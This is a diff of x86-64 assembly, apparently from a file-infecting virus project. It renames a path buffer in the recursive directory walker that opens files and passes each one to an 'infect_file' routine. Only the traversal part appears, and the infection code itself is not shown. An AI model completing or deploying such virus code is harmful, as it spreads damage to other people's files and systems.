@@ -20,7 +20,7 @@ recursive:
 	mov r12, rdi			;  buff[4096]
 	cmp r12, 0
 	jz recursive_exit
-	lea rdi, [r12 + pathBuffer]
+	lea rdi, [r12 + fileName]
 	mov rsi, 0			    ; O_RDONLY
 	mov rax, SYS_OPEN   	; open("", O_RDONLY);
 	syscall
@@ -55,7 +55,7 @@ recursive:
 	add rax, r8
 	cmp rax, PATH_BUFF_SIZE - 2
 	jge end_recur
-	lea rdi, [r12 + pathBuffer + r8]
+	lea rdi, [r12 + fileName + r8]
 	cmp byte [rdi - 1], '/'
 	jz slash_ok
 	mov byte [rdi], '/'
@@ -81,11 +81,11 @@ recursive:
 
 	recursive_infect_file:
 
-;	lea rdi, [r12 + pathBuffer]
+;	lea rdi, [r12 + fileName]
 ;	call ft_strlen
 ;	mov rdx, rax
 ;	mov rdi, STDOUT
-;	lea rsi, [r12 + pathBuffer]
+;	lea rsi, [r12 + fileName]
 ;	mov rax, SYS_WRITE
 ;	syscall
 ;	mov rdi, STDOUT
@@ -98,8 +98,7 @@ recursive:
 	push r13
 	push r12
 	push r8
-	lea rdi, [r12 + pathBuffer]
-	mov rsi, r12
+	mov rdi, r12
 	call infect_file
 	pop r8
 	pop r12
@@ -132,7 +131,7 @@ recursive:
 	pop r14
 	pop r15
 	xor rdi, rdi
-	lea rdi, [r12 + pathBuffer + r8]
+	lea rdi, [r12 + fileName + r8]
 	
 	mov [rdi], byte 0
 
